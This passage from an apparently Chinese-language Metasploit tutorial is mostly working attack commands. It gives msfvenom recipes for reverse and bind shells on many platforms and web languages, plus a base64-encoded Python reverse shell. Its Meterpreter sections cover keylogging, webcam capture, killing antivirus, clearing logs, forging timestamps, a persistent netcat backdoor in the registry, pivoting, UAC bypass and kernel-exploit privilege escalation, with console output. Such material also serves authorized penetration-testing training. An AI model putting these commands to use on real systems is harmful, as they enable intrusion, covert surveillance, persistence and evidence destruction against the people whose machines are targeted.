设置/禁用适用于所有模块的全局参数 </span><br><span class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span><br></pre></td></tr></table></figure><h2 id="3-msfvenom生成payload-5"><a href="#3-msfvenom生成payload-5" class="headerlink" title="3 msfvenom生成payload"></a>3 msfvenom生成payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</span><br><span class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    --payload-options            列举payload的标准选项</span><br><span class="line">-o, --out   &lt;path&gt;               保存payload</span><br><span class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</span><br><span class="line">    --shellest                   最小化生成payload</span><br><span class="line">-h, --help                       查看帮助选项</span><br><span class="line">    --help-formats               查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>1.可执行程序Linux<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">正向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>Windows<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>Mac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>执行方式：直接复制可执行程序到目标机器上执行就行了。2.Web PayloadsPHP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>ASP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>JSP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>WAR<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>3.脚本shellPython<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>Bash<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>Perl<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>执行方式：复制shell.py中的内容在linux命令行下执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>4.shellcode<br>Linux Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>Windows Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>Mac Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><h2 id="4-Meterpreter基本命令-5"><a href="#4-Meterpreter基本命令-5" class="headerlink" title="4. Meterpreter基本命令"></a>4. Meterpreter基本命令</h2>首先需要先获取meterpreter：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span><br><span class="line">jobs  # 查看后台攻击任务 </span><br><span class="line">kill &lt;id&gt;  # 停止某后台攻击任务 </span><br><span class="line">sessions -l  # (查看会话)</span><br><span class="line">sessions -i 2   # 选择会话</span><br><span class="line">sessions -k 2   # 结束会话</span><br></pre></td></tr></table></figure>如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。获取到了meterpreter，就可以进行后渗透了。<h3 id="4-1-基本系统命令-5"><a href="#4-1-基本系统命令-5" class="headerlink" title="4.1 基本系统命令"></a>4.1 基本系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># 会话管理</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">sessions  # 查看会话</span><br><span class="line">sessions -i  # 切换会话</span><br><span class="line">quit  # 关闭当前的会话，返回msf终端</span><br><span class="line"></span><br><span class="line"># 系统设置</span><br><span class="line">sysinfo  # 查看目标机系统信息</span><br><span class="line">idletime  # 查看目标机闲置时间</span><br><span class="line">reboot/shutdown   # 重启/关机</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # 获得控制台权限</span><br><span class="line">irb  # 进入ruby终端</span><br><span class="line"></span><br><span class="line"># 进程迁移</span><br><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line"></span><br><span class="line"># 执行文件</span><br><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line"></span><br><span class="line"># 摄像头命令</span><br><span class="line">webcam_list  #查看摄像头列表</span><br><span class="line">webcam_chat  # 查看摄像头接口</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   #通过摄像头开启视频</span><br><span class="line"></span><br><span class="line"># uictl开关键盘/鼠标</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br><span class="line"></span><br><span class="line"># 远程桌面/截屏</span><br><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br><span class="line"></span><br><span class="line"># 键盘记录</span><br><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br><span class="line"></span><br><span class="line"># 添加用户，开启远程桌面</span><br><span class="line"># 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><br><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</span><br><span class="line"></span><br><span class="line"># 关闭防病毒软件</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># 修改注册表</span><br><span class="line">reg –h # 注册表命令帮助</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line">nc -v 192.168.81.162 443  #攻击者连接nc后门</span><br><span class="line"></span><br><span class="line"># 清理日志</span><br><span class="line">clearav  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure><h3 id="4-2-文件系统命令-5"><a href="#4-2-文件系统命令-5" class="headerlink" title="4.2 文件系统命令"></a>4.2 文件系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # 基本命令</span><br><span class="line">search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助</span><br><span class="line">getwd/pwd  # 获取当前目录</span><br><span class="line">getlwd/lpwd   # 操作攻击者主机 查看当前目录</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # 上传文件</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件</span><br><span class="line">edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件</span><br><span class="line">mkdir lltest2  # 只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  # 只能删除当前目录下文件夹</span><br><span class="line">lcd /tmp   # 操作攻击者主机 切换目录</span><br><span class="line"></span><br><span class="line"># timestomp伪造文件时间戳</span><br><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure><h3 id="4-3-网络命令-5"><a href="#4-3-网络命令-5" class="headerlink" title="4.3 网络命令"></a>4.3 网络命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># 基本</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br><span class="line"></span><br><span class="line"># portfwd端口转发</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加路由</span><br><span class="line"></span><br><span class="line"># 方式一autoroute （deprecated）</span><br><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.2.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br><span class="line"># 方式二post/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络</span><br><span class="line">run post/multi/manage/autoroute CMD=print # 查看添加的路由</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># 然后可以利用arp_scanner、portscan等进行扫描</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autoroute添加完路由后，还可以利用msf自带的模块进行socks代理</span><br><span class="line"># msf提供了2个模块用来做socks代理。</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># 先background退出来，然后：</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080</span><br><span class="line"># 最后proxychains 使用Socks5代理访问</span><br><span class="line"></span><br><span class="line"># sniffer抓包</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure><h3 id="4-4-信息收集-5"><a href="#4-4-信息收集-5" class="headerlink" title="4.4 信息收集"></a>4.4 信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 信息收集的脚本位于：</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># 以下列举一些常用的</span><br><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure><h3 id="4-5-提权-5"><a href="#4-5-提权-5" class="headerlink" title="4.5 提权"></a>4.5 提权</h3>1.getsystem提权<br>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>2.bypassuac<br>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。msf提供了如下几个模块帮助绕过UAC：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 示例</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功</span><br><span class="line"># 然鹅这里失败了</span><br></pre></td></tr></table></figure>3.内核漏洞提权无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) 